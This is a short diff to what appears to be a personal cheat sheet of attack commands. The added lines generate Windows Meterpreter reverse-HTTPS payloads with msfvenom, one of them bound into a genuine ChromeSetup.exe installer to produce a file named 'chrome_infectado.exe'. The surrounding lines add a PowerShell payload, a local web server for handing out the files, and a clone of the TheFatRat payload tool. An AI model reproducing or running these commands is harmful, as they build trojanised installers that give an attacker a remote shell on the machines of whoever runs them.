@@ -4,9 +4,16 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f e
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe
 
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -o chrome_infectado.exe
+
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x /caminho/completo/ChromeSetup.exe -o chrome_infectado.exe
+
+
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1
 
 python3 -m http.server 8080
+
 
 
 git clone https://github.com/Screetsec/TheFatRat.git
